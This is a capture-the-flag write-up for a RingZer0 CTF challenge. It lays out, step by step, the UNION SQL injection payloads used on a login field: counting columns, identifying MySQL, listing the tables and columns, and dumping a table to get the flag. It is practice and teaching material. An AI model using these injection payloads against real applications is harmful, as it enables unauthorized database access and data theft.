# URL
https://ringzer0ctf.com/challenges/2
# Concept
* UNION SQL injection
# Method of solve
* we are directed to this website:
```
http://challenges.ringzer0ctf.com:10002/
```
* on this page, we can make a request to the app which sends a POST request to the app, which we can inject into
## Step 1 - Determine the number of columns for the union select
```
admin' union select null, null, null -- -
```
* this lets us know there are three columns in the original SQL query
## Step 2 - Determine the DBMS being used by the app
```
admin' union select null, null, version() -- -
```
* this implies that a MySQL or MariaDB system is being used
## Step 3 - Determine the database name
```
admin' union select null, null, database() -- -
```
* the name of the database is `chal2`
## Step 4 - Determine the tables in the database
```
admin' UNION SELECT NULL,NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='chal2'-- -
```
* this lets us know there are the `c2_group`, `c2_group_membership`, and `c2_user` tables in the database
## Step 5 - Determine the columns in the tables
```
admin' UNION SELECT NULL, NULL, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='chal2' AND TABLE_NAME='c2_group'-- 
```
* there are `description`, `groupname`, and `id` columns in the `c2_group` table
## Step 6 - Dump the table contents
```
username=admin' UNION SELECT description,groupname,id FROM c2_group -- -
```
* we find the flag in the response

